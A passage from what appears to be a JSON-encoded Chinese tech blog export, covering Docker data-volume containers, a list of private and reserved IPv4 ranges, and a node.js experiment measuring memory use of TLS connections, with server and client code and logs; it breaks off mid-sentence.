\u300b\u4e2d\uff0c\u5f53\u5bb9\u5668\u88ab\u5220\u9664\u4e4b\u540e\u4e0a\u4f20\u7684\u6587\u4ef6\u5c06\u4e22\u5931\uff0c\u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a\u6570\u636e\u5377\u5bb9\u5668\u4e13\u95e8\u7528\u6765\u4fdd\u5b58\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u8fd9\u4e2a\u6570\u636e\u5377\u5bb9\u5668\u53ef\u4ee5\u4e3a\u591a\u4e2a\u5e94\u7528\u5bb9\u5668\u63d0\u4f9b\u6570\u636e\u6301\u4e45\u5316\u529f\u80fd\u3002\n<\/p>\n\n<p>\n\u5176\u5b9e\u4e5f\u53ef\u4ee5\u6302\u8f7d\u672c\u5730\u6587\u4ef6\u76ee\u5f55\u505a\u4e3a\u5bb9\u5668\u7684\u6570\u636e\u5377\uff0c\u4f46\u4f7f\u7528\u6570\u636e\u5377\u5bb9\u5668\u66f4\u89c4\u8303\u4e00\u4e9b\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u521b\u5efa\u6570\u636e\u5377\u5bb9\u5668<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker run -d -v \/usr\/local\/upload-fiddle\/public\/files --name upload-fiddle<span style=\"text-decoration: underline;\">-data <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'dl.dockerpool.com:5000\/ubuntu:14.04'<\/span><span style=\"text-decoration: underline;\"> echo <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'upload-fiddle data container'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u6570\u636e\u5377\u5bb9\u5668\u4e0d\u9700\u8981\u8fd0\u884c\u4ee5\u8282\u7ea6\u8d44\u6e90\uff0c\u5b83\u5b58\u5728\u7684\u76ee\u7684\u53ea\u662f\u5bf9\u6570\u636e\u5377\u8fdb\u884c\u5f15\u7528\uff0c\u907f\u514d\u6570\u636e\u5377\u88ab\u610f\u5916\u5220\u9664\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u6302\u8f7d\u6570\u636e\u5377\u5bb9\u5668<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker run -idt --name=<span style=\"color: #66cccc;\">'upload-fiddle'<\/span> -p 127.0.0.1:80:80 --volumes-from up<span style=\"text-decoration: underline;\">load-fiddle-data <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'tangxinfa\/upload-fiddle:0.0.1'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u4f7f\u7528 <code>--volumes-from<\/code> \u9009\u9879\u5f15\u7528\u5bb9\u5668\u4e2d\u7684\u6570\u636e\u5377\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u6570\u636e\u5377\u5bb9\u5668\u6570\u636e\u5b58\u50a8\u4f4d\u7f6e<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u67e5\u770b\u6570\u636e\u5377\u5bb9\u5668\u6302\u8f7d\u4fe1\u606f\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker inspect -f {{.Mounts}} upload-fiddle-data\n<\/pre>\n<\/div>\n\n<p>\n\u53ef\u4ee5\u770b\u5230\u6570\u636e\u5b58\u50a8\u5728\u5bbf\u4e3b\u673a\u7684 <code>\/var\/lib\/docker\/volumes\/<\/code> \u76ee\u5f55\u4e0b\u3002\n<\/p>\n\n<p>\n\u6570\u636e\u5377\u53ea\u6709\u5f53\u6700\u540e\u4e00\u4e2a\u5f15\u7528\u5b83\u7684\u5bb9\u5668\u4f7f\u7528 <code>-v<\/code> \u9009\u9879\u8fdb\u884c\u5220\u9664\uff08 <code>docker rm<\/code> \u547d\u4ee4\uff09\u65f6\uff0c\u624d\u4f1a\u88ab\u5220\u9664\u3002\n<\/p>\n\n<p>\n\u53ef\u4ee5\u4f7f\u7528 <code>docker volume<\/code> \u547d\u4ee4\u5bf9\u6570\u636e\u5377\u8fdb\u884c\u7ba1\u7406\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n\u300a<a href=\"http:\/\/container-solutions.com\/understanding-volumes-docker\/\">Understanding Volumes in Docker - Container Solutions<\/a>\u300b<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5185\u7f51IP\u6bb5\u6709\u54ea\u4e9b",
  "timestamp": "2015-12-18 14:39:00",
  "tags": [
    "network"
  ],
  "body": "<p>\n\u5e38\u89c1\u7684\u5185\u7f51IP\u6bb5\u6709\uff1a\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> 10.0.0.0\/8 <\/dt><dd>10.0.0.0 - 10.255.255.255\n<\/dd>\n\n<dt> 172.16.0.0\/12 <\/dt><dd>172.16.0.0 - 172.31.255.255\n<\/dd>\n\n<dt> 192.168.0.0\/16 <\/dt><dd>192.168.0.0 - 192.168.255.255\n<\/dd>\n<\/dl>\n\n<p>\n\u4ee5\u4e0a\u4e09\u4e2a\u7f51\u6bb5\u5206\u522b\u5c5e\u4e8eA\u3001B\u3001C\u4e09\u7c7bIP\u5730\u5740\uff0c\u6765\u81ea \u300a<a href=\"https:\/\/tools.ietf.org\/html\/rfc1918\">RFC 1918<\/a>\u300b\u3002\n<\/p>\n\n<p>\n\u4f46\u662f\u6839\u636e \u300a<a href=\"https:\/\/en.wikipedia.org\/wiki\/Reserved_IP_addresses\">Reserved IP addresses - Wikipedia, the free encyclopedia<\/a>\u300b \u53ca\u300a<a href=\"https:\/\/tools.ietf.org\/html\/rfc6890\">RFC 6890 - Special-Purpose IP Address Registries<\/a>\u300b\u7684\u63cf\u8ff0\uff0c\n\u8fd8\u6709\u5f88\u591a\u5176\u5b83\u7684\u5185\u7f51IP\u6bb5\uff08\u5305\u62ecIPv6\uff09\uff0c\u4ee5\u53ca\u5176\u5b83\u7528\u9014\u7684\u4fdd\u7559IP\u5730\u5740\u3002\n<\/p>\n\n<p>\n\u5176\u5b83IPv4\u5185\u7f51\u6bb5\u7f57\u5217\u5982\u4e0b\uff1a\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> 0.0.0.0\/8 <\/dt><dd>0.0.0.0 - 0.255.255.255\n\n<p>\n\u7528\u4e8e\u5f53\u524d\u7f51\u7edc\u5185\u7684\u5e7f\u64ad\u6d88\u606f\u3002\n<\/p>\n<\/dd>\n\n<dt> 100.64.0.0\/10 <\/dt><dd>100.64.0.0 - 100.127.255.255\n\n<p>\n\u7531\u8fd0\u8425\u5546\u4f7f\u7528\u7684\u79c1\u7f51IP\u6bb5\uff0c\u968f\u7740IPv4\u5730\u5740\u6c60\u7684\u8017\u5149\uff0c\u4f1a\u6709\u66f4\u591a\u7528\u6237\u88ab\u5206\u914d\u5230\u8fd9\u4e2a\u7f51\u6bb5\u3002\n<\/p>\n<\/dd>\n\n<dt> 127.0.0.0\/8 <\/dt><dd>127.0.0.0 - 127.255.255.255\n\n<p>\n\u672c\u673a\u56de\u73af\u5730\u5740\u3002\n<\/p>\n<\/dd>\n\n<dt> 169.254.0.0\/16 <\/dt><dd>169.254.0.0 - 169.254.255.255\n\n<p>\n\u83b7\u53d6\u4e0d\u5230IP\u5730\u5740\u65f6\u4f7f\u7528\uff0c\u901a\u5e38\u56e0\u4e3a\u4eceDHCP\u670d\u52a1\u5668\u83b7\u53d6\u4e0d\u5230IP\u3002\n<\/p>\n<\/dd>\n\n<dt> 192.0.0.0\/24 <\/dt><dd>192.0.0.0 - 192.0.0.255\n\n<p>\nUsed for the IANA IPv4 Special Purpose Address Registry as specified by RFC 5736\n<\/p>\n\n<p>\n\u4e00\u822c\u7528\u6237\u4e0d\u53ef\u80fd\u88ab\u5206\u914d\u5230\u8fd9\u4e2aIP\u6bb5\u3002\n<\/p>\n<\/dd>\n\n<dt> 192.0.2.0\/24 <\/dt><dd>192.0.2.0 - 192.0.2.255\n\n<p>\nAssigned as \"TEST-NET\" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.\n<\/p>\n\n<p>\n\u4e00\u822c\u7528\u6237\u4e0d\u53ef\u80fd\u88ab\u5206\u914d\u5230\u8fd9\u4e2aIP\u6bb5\u3002\n<\/p>\n<\/dd>\n\n<dt> 198.18.0.0\/15 <\/dt><dd>198.18.0.0 - 198.19.255.255\n\n<p>\n\u7528\u4e8e\u6d4b\u8bd5\u4e24\u4e2a\u72ec\u7acb\u5b50\u7f51\u7684\u7f51\u95f4\u901a\u4fe1\u3002\n<\/p>\n\n<p>\n\u4e00\u822c\u7528\u6237\u4e0d\u53ef\u80fd\u88ab\u5206\u914d\u5230\u8fd9\u4e2aIP\u6bb5\u3002\n<\/p>\n<\/dd>\n\n<dt> 198.51.100.0\/24 <\/dt><dd>198.51.100.0 - 198.51.100.255\n\n<p>\nAssigned as \"TEST-NET-2\" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.\n<\/p>\n\n<p>\n\u4e00\u822c\u7528\u6237\u4e0d\u53ef\u80fd\u88ab\u5206\u914d\u5230\u8fd9\u4e2aIP\u6bb5\u3002\n<\/p>\n<\/dd>\n\n<dt> 203.0.113.0\/24 <\/dt><dd>203.0.113.0 - 203.0.113.255\n\n<p>\nAssigned as \"TEST-NET-3\" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.\n<\/p>\n\n<p>\n\u4e00\u822c\u7528\u6237\u4e0d\u53ef\u80fd\u88ab\u5206\u914d\u5230\u8fd9\u4e2aIP\u6bb5\u3002\n<\/p>\n<\/dd>\n\n<dt> 255.255.255.255\/32 <\/dt><dd>255.255.255.255\n\n<p>\n\u672c\u7f51\u6bb5\u7684\u5e7f\u64ad\u5730\u5740\u3002<\/p>\n<\/dd>\n<\/dl>\n"
},
{
  "title": "tls\u8fde\u63a5\u5185\u5b58\u5360\u7528",
  "timestamp": "2015-12-21 00:17:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n\u6211\u4eec\u6709\u4e00\u4e2a <code>node.js<\/code> \u670d\u52a1\uff0c\u6709\u5927\u91cf <code>tls<\/code> \u957f\u8fde\u63a5\uff0c\u8dd1\u4e86\u4e00\u6bb5\u65f6\u95f4\u540e\u53d1\u73b0\u5185\u5b58\u6d88\u8017\u6bd4\u8f83\u5927\uff0c\u6bcf\u4e2a <code>node.js<\/code> \u5b9e\u4f8b\u7ef4\u6301 <code>3000<\/code> \u4e2a\u8fde\u63a5\u9700\u8981\u6d88\u8017 <code>1G<\/code> \u7565\u591a\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e5f\u4e0d\u80fd\u786e\u5b9a\u6709\u5185\u5b58\u6cc4\u9732\uff0c\u6bd5\u7adf\u5185\u5b58\u6ca1\u6709\u518d\u5f80\u4e0a\u6da8\u5bfc\u81f4\u670d\u52a1\u4e2d\u65ad\uff0c\u6240\u4ee5\u89c9\u5f97\u6709\u5fc5\u8981\u6d4b\u8bd5\u4e00\u4e0b <code>tls<\/code> \u8fde\u63a5\u7684\u5185\u5b58\u6d88\u8017\u60c5\u51b5\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">tls\u670d\u52a1\u5668<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">tls<\/span>         = require(<span style=\"color: #66cccc;\">'tls'<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   fs          = require(<span style=\"color: #66cccc;\">'fs'<\/span>);\n\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">options<\/span> = {\n<span style=\"background-color: #515151;\"> <\/span>   key: fs.readFileSync(<span style=\"color: #66cccc;\">'server.key'<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   cert: fs.readFileSync(<span style=\"color: #66cccc;\">'server.cert'<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   handshakeTimeout: 10*1000,\n<span style=\"background-color: #515151;\"> <\/span>   plain: <span style=\"color: #6699cc;\">true<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   ssl: <span style=\"color: #6699cc;\">true<\/span>\n};\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">port<\/span> = 1234;\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">tlsServer<\/span> = tls.createServer(options, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">socket<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   socket.on(<span style=\"color: #66cccc;\">\"close\"<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.warn(<span style=\"color: #66cccc;\">'tls client('<\/span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'<\/span> + socket.remoteP<span style=\"text-decoration: underline;\">ort +<\/span><span style=\"color: #66cccc; text-decoration: underline;\">') closed'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   });\n}).listen(port, <span style=\"color: #66cccc;\">\"0.0.0.0\"<\/span>, <span style=\"color: #99cc99;\">function<\/span>(){\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'tls server listening on port('<\/span> + port + <span style=\"color: #66cccc;\">')'<\/span>);\n});\ntlsServer.maxConnections = 10000;\ntlsServer.on(<span style=\"color: #66cccc;\">'clientError'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">exception<\/span>, <span style=\"color: #ffcc66;\">socket<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.warn(<span style=\"color: #66cccc;\">'tls client('<\/span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'<\/span> + socket.remotePort <span style=\"text-decoration: underline;\">+<\/span><span style=\"color: #66cccc; text-decoration: underline;\">') error('<\/span><span style=\"text-decoration: underline;\"> + exception + <\/span><span style=\"color: #66cccc; text-decoration: underline;\">')'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   socket.destroy();\n});\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">memoryUsage<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">mem<\/span> = process.memoryUsage();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">format<\/span> = <span style=\"color: #99cc99;\">function<\/span>(<span style=\"color: #ffcc66;\">bytes<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> (bytes\/1024\/1024).toFixed(2)+<span style=\"color: #66cccc;\">'MB'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   };\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'Process: heapTotal '<\/span>+format(mem.heapTotal) + <span style=\"color: #66cccc;\">' heapUsed '<\/span> + for<span style=\"text-decoration: underline;\">mat(mem.heapUsed) + <\/span><span style=\"color: #66cccc; text-decoration: underline;\">' rss '<\/span><span style=\"text-decoration: underline;\"> + format(mem.rss));<\/span>\n}\n\nsetInterval(<span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   tlsServer.getConnections(<span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>, <span style=\"color: #ffcc66;\">tlsCount<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.error(<span style=\"color: #66cccc;\">\"get tls connections count error(\"<\/span> + err.toString() + <span style=\"color: #66cccc; text-decoration: underline;\">\")\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.warn(<span style=\"color: #66cccc;\">\"server: tls connections(\"<\/span> + tlsCount + <span style=\"color: #66cccc;\">\")\"<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   memoryUsage();\n<span style=\"background-color: #515151;\"> <\/span>   });\n}, 1*1000);\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">tls\u5ba2\u6237\u7aef<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">tls<\/span> = require(<span style=\"color: #66cccc;\">'tls'<\/span>);\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">tlsCount<\/span> = 0;\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">connect<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">socket<\/span> = tls.connect(1234, {rejectUnauthorized: <span style=\"color: #6699cc;\">false<\/span>}, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   tlsCount += 1;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   socket.setEncoding(<span style=\"color: #66cccc;\">'utf8'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   socket.on(<span style=\"color: #66cccc;\">'data'<\/span>, <span style=\"color: #99cc99;\">function<\/span>(<span style=\"color: #ffcc66;\">data<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   });\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   socket.on(<span style=\"color: #66cccc;\">'close'<\/span>, <span style=\"color: #99cc99;\">function<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   tlsCount -= 1;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   });\n<span style=\"background-color: #515151;\"> <\/span>   });\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">memoryUsage<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">mem<\/span> = process.memoryUsage();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">format<\/span> = <span style=\"color: #99cc99;\">function<\/span>(<span style=\"color: #ffcc66;\">bytes<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> (bytes\/1024\/1024).toFixed(2)+<span style=\"color: #66cccc;\">'MB'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   };\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'Process: heapTotal '<\/span>+format(mem.heapTotal) + <span style=\"color: #66cccc;\">' heapUsed '<\/span> + for<span style=\"text-decoration: underline;\">mat(mem.heapUsed) + <\/span><span style=\"color: #66cccc; text-decoration: underline;\">' rss '<\/span><span style=\"text-decoration: underline;\"> + format(mem.rss));<\/span>\n}\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">round<\/span> = 0;\nsetInterval(<span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (round &lt; 10) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>(<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">i<\/span> = 0; i &lt; 100; ++i) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   connect();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   round += 1;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   console.warn(<span style=\"color: #66cccc;\">\"client: tls connections(\"<\/span> + tlsCount + <span style=\"color: #66cccc;\">\")\"<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   memoryUsage();\n}, 1000);\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">tls\u670d\u52a1\u5668\u65e5\u5fd7<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u8fde\u63a5\u4ece <code>0<\/code> \u5230 <code>1000<\/code> \u5185\u5b58\u589e\u957f\n<\/p>\n\n<pre class=\"example\">\nserver: tls connections(0)\nProcess: heapTotal 9.14MB heapUsed 4.80MB rss 23.69MB\nserver: tls connections(100)\nProcess: heapTotal 10.13MB heapUsed 5.59MB rss 29.53MB\nserver: tls connections(200)\nProcess: heapTotal 10.13MB heapUsed 6.75MB rss 32.32MB\nserver: tls connections(300)\nProcess: heapTotal 9.18MB heapUsed 7.32MB rss 34.37MB\nserver: tls connections(400)\nProcess: heapTotal 10.16MB heapUsed 8.11MB rss 37.05MB\nserver: tls connections(500)\nProcess: heapTotal 11.14MB heapUsed 8.66MB rss 38.18MB\nserver: tls connections(600)\nProcess: heapTotal 11.14MB heapUsed 9.48MB rss 39.73MB\nserver: tls connections(600)\nProcess: heapTotal 12.12MB heapUsed 9.62MB rss 40.50MB\nserver: tls connections(700)\nProcess: heapTotal 15.04MB heapUsed 10.16MB rss 42.69MB\nserver: tls connections(800)\nProcess: heapTotal 18.97MB heapUsed 10.72MB rss 44.50MB\nserver: tls connections(900)\nProcess: heapTotal 18.97MB heapUsed 11.68MB rss 46.30MB\nserver: tls connections(1000)\nProcess: heapTotal 18.97MB heapUsed 12.63MB rss 47.32MB\n<\/pre>\n\n<p>\ntls\u5ba2\u6237\u7aef\u7ed3\u675f\u540e\u8fde\u63a5\u6570\u4ece <code>1000<\/code> \u964d\u5230 <code>0<\/code> \u7ea6 <code>30<\/code> \u79d2\u540e\n<\/p>\n\n<pre class=\"example\">\nserver: tls connections(0)\nProcess: heapTotal 22.91MB heapUsed 13.63MB rss 48.44MB\n<\/pre>\n\n<p>\n\u4ece\u4e0a\u9762\u7684\u65e5\u5fd7\u53ef\u4ee5\u8ba1\u7b97\u51fa\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u6bcf <code>tls<\/code> \u8fde\u63a5 <code>rss<\/code> \u8981\u6d88\u8017 <code>24.2KB<\/code>  <code>heap<\/code> \u8981\u6d88\u8017 <code>8KB<\/code>\n<\/li>\n\n<li>\u8fde\u63a5\u5173\u95ed\u540e\u5185\u5b58\u6ca1\u6709\u91ca\u653e\n\n<p>\n\u8fd8\u7565\u6709\u589e\u52a0\uff0c\u8981\u4e48\u5c31\u662f <code>node.js<\/code> \u6ca1\u6709\u91ca\u653e <code>tls<\/code> \u8fde\u63a5\u7684\u5185\u5b58\uff08\u5e94\u8be5\u4e0d\u592a\u53ef\u80fd\uff09\uff0c\u8981\u4e48\u5c31\u662f\u6211\u7684\u4ee3\u7801\u6709\u95ee\u9898\uff0c\u6ca1\u6709\u91ca\u653e\u8d44\u6e90\n<\/p>\n<\/li>\n<\/ul>\n\n<p>\n\u4f7f\u7528 <code>heapdump<\/code> \u5bfc\u51fa\u5806\u6570\u636e\u540e\u901a\u8fc7 <code>Chromium<\/code> \u7684\u5f00\u53d1\u5de5\u5177\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4e8b\u60c5\u6ca1\u8fd9\u4e48\u7b80\u5355\uff0c\u5360\u7528\u7684\u5185\u5b58\u7edd\u5927\u90e8\u5206\u662f\u4ee3\u7801\uff0c\n<code>tls<\/code> \u670d\u52a1\u5668\u4e0d\u9000\u51fa\uff0c\u4f7f\u7528 <code>tls<\/code> \u5ba2\u6237\u7aef\u6d4b\u8bd5\u591a\u8f6e\u540e\u53ef\u4ee5\u53d1\u73b0 <code>rss<\/code> \u5185\u5b58\u5360\u7528\u4e0d\u4f1a\u589e\u52a0\uff0c <code>tls<\/code> \u5ba2\u6237\u7aef\u9000\u51fa\u5173\u95ed\u6240\u6709\u8fde\u63a5\u540e\uff0c\n<code>rss<\/code> \u5185\u5b58\u5360\u7528\u603b\u662f\u4f1a\u6062\u590d\u5230\u540c\u4e00\u6c34\u5e73\uff0c\u8fd9\u5c31\u8bf4\u660e\u4ee3\u7801\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c\u5e94\u8be5\u4e0d\u5b58\u5728\u5185\u5b58\u6cc4\u9732\u3002\n<\/p>\n\n<p>\n\u591a\u8f6e\u6d4b\u8bd5\u540e\u91cd\u65b0\u53d6\u6837\uff1a\n<\/p>\n\n<pre class=\"example\">\nserver: tls connections(0)\nProcess: heapTotal 21.93MB heapUsed 13.22MB rss 54.06MB\nserver: tls connections(100)\nProcess: heapTotal 21.93MB heapUsed 14.16MB rss 54.06MB\nserver: tls connections(200)\nProcess: heapTotal 25.86MB heapUsed 14.79MB rss 58.57MB\nserver: tls connections(300)\nProcess: heapTotal 25.86MB heapUsed 15.76MB rss 59.08MB\nserver: tls connections(400)\nProcess: heapTotal 25.86MB heapUsed 16.69MB rss 59.08MB\nserver: tls connections(500)\nProcess: heapTotal 27.83MB heapUsed 16.72MB rss 60.37MB\nserver: tls connections(600)\nProcess: heapTotal 27.83MB heapUsed 17.65MB rss 60.37MB\nserver: tls connections(700)\nProcess: heapTotal 33.74MB heapUsed 15.76MB rss 59.32MB\nserver: tls connections(800)\nProcess: heapTotal 33.74MB heapUsed 16.71MB rss 59.32MB\nserver: tls connections(800)\nProcess: heapTotal 33.74MB heapUsed 16.83MB rss 59.32MB\nserver: tls connections(900)\nProcess: heapTotal 33.74MB heapUsed 18.31MB rss 59.38MB\nserver: tls connections(1000)\nProcess: heapTotal 33.74MB heapUsed 19.24MB rss 59.38MB\n<\/pre>\n\n<p>\n\u4ece\u4e0a\u9762\u7684\u65e5\u5fd7\u53ef\u4ee5\u8ba1\u7b97\u51fa\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u6bcf <code>tls<\/code> \u8fde\u63a5 <code>rss<\/code> \u8981\u6d88\u8017 <code>5.45KB<\/code> \uff0c <code>heap<\/code> \u8981\u6d88\u8017 <code>6.16KB<\/code>\n<\/li>\n<\/ul>\n\n<p>\n\u4e5f\u5c31\u662f\u8bf4\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c <code>3000<\/code> \u4e2a <code>tls<\/code> \u8fde\u63a5\uff0c <code>rss<\/code> \u4f1a\u6d88\u8017 <code>16MB<\/code> \uff0c <code>heap<\/code> \u4f1a\u6d88\u8017 <code>18MB<\/code> \uff0c\u5360\u7528 <code>1G<\/code> \u7684\u95ee\u9898\u80af\u5b9a\u51fa\u5728\u5176\u5b83\u5730\u65b9\u3002\n<\/p>\n\n<p>\n\u53e6\u5916\u6ce8\u610f\u5230\u8c03\u7528 <code>heapdump.writeSnapshot<\/code> \u540e\u5185\u5b58\u5360\u7528\u5927\u5e45\u4e0b\u964d\uff0c\u5e94\u8be5\u662f <code>heapdump<\/code> \u89e6\u53d1\u4e86 <code>v8<\/code> \u7684\u5783\u573e\u56de\u6536\uff0c <code>v8<\/code> \u7684\u5783\u573e\u56de\u6536\u5e94\u8be5\u4e0d\u662f\u5b9e\u65f6\u7cbe\u786e\u7684\uff0c\u8981\u7cbe\u786e\u6d4b\u91cf\u5185\u5b58\u5360\u7528\uff0c\u4f30\u8ba1\u4e5f\u8981\u50cf <code>heapdump<\/code> \u4e00\u6837\u8ba9 <code>v8<\/code> \u5c06\u5168\u90e8\u5783\u573e\u56de\u6536\u540e\u518d\u6d4b\u91cf\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u4e0d\u540c\u7248\u672c\u7684node.js\u7ed3\u679c\u4f1a\u6709\u5dee\u5f02<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n\u4e3a\u4e86\u5b8c\u5168\u6a21\u62df\u771f\u5b9e\u73af\u5883\uff0c\u9488\u5bf9\u6bcf\u4e00\u4e2a\u63a5\u6536\u7684 <code>tls<\/code> 